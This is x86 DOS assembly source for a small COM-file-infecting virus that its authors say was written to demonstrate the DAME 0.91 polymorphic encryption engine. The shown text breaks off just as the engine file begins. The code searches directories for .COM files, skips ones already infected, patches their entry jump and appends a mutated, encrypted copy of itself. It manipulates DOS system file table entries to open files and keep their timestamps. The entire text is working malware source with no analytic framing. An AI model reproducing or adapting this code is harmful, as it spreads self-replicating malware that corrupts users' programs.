        .code
        .radix  16
        org     100

start:  jmp     temp                    ; The next two lines will be patched in
;        cld                            ; DAME may have altered DF
;        mov     bx,ds
        call    calc_off

old4    dw      20cdh, 0
fmask   db      '*.com',0
dmask   db      '..',0

        db  0dh,'This is a lame virus slapped together by DA/PS',0Dh,0A
        db      'To demonstrate DAME 0.91',0Dh,0A,1a

vars    = 0
        include dame.asm                ; include the code portion of DAME

calc_off:
        pop     si
        mov     ax,si
        mov     cl,4
        shr     ax,cl
        sub     ax,10
        add     ax,bx
        mov     bx,offset enter_vir
        push    ax bx
        retf

enter_vir:
        mov     di,100
        push    es di es es
        movsw
        movsw
enter_vir0:
        push    cs cs
        pop     es ds
        mov     ah,1a
        mov     dx,offset new_dta               ; set new DTA
        int     21

        mov     ah,47
        cwd
        mov     si,offset old_path+1
        mov     byte ptr [si-1],'\'
        int     21

        mov     inf_cnt,4

        call    rnd_init_seed
inf_dir:mov     ah,4e
        mov     dx,offset fmask
fnext:  int     21
        jnc     inf_file

        mov     ah,3bh
        mov     dx,offset dmask
        int     21
        jnc     inf_dir
done_all:
        mov     ah,3bh
        mov     dx,offset old_path
        int     21

        pop     es ds                           ; restore the DTA
        mov     dx,80
        mov     ah,1a
        int     21

        retf                                    ; return to carrier

inf_file:
        mov     ax,3d00
        mov     dx,offset new_dta + 1e
        int     21
        jc      _fnext
        xchg    ax,bx

        mov     ah,3f
        mov     cx,4
        mov     dx,offset old4
        int     21

        mov     ah,3e
        int     21

        cmp     old4,0e9fc
        jz      _fnext
        add     al,ah
        cmp     al,'Z'+'M'
        jz      _fnext
        call    infect
        dec     inf_cnt
        jz      done_all
_fnext:
        mov     ah,4f
        jmp     short fnext

infect: mov     ax,3d00
        mov     dx,offset new_dta + 1e
        int     21
        push    ax
        xchg    ax,bx

        mov     ax,1220
        int     2f

        mov     ax,1216
        mov     bl,es:di
        mov     bh,0
        int     2f

        pop     bx

        mov     word ptr es:[di+2],2

        mov     ax,es:[di+11]
        mov     bp,ax
        mov     cx,4
        sub     ax,cx
        mov     patch,ax

        mov     ah,40
        mov     dx,offset oFCE9
        int     21

        mov     word ptr es:[di+15],bp

        push    es di cs
        pop     es

        mov     si,100
        mov     di,offset copyvirus
        mov     cx,(heap - start + 1)/2
        rep     movsw

        mov     ax,0000000000001011b
        mov     dx,offset copyvirus
        mov     cx,heap - start
        mov     si,offset _decryptbuffer
        mov     di,offset _encryptbuffer
        push    dx bx si
        mov     bx,bp
        inc     bh
        call    dame

        mov     ah,40
        pop     dx bx
        int     21

        mov     ah,40
        mov     cx,heap - start
        pop     dx
        int     21

        pop     di es
        or      byte ptr es:[di+6],40

        mov     ah,3e
        int     21

        retn

oFCE9   dw      0e9fc
heap:
patch   dw      ?
inf_cnt db      ?

vars    = 1
        include dame.asm        ; include the heap portion of DAME

old_path        db       41 dup (?)
new_dta         db       2c dup (?)
_encryptbuffer: db       80 dup (?)
_decryptbuffer: db      1a0 dup (?)
copyvirus       db      heap - start + 20 dup (?)

temp:   mov     byte ptr ds:[100],0fc
        mov     word ptr ds:[101],0db8c
        xor     di,di
        push    cs di cs cs
        jmp     enter_vir0

        end     start
--End LAME.ASM--Begin DAME.ASM-------------------------------------------------
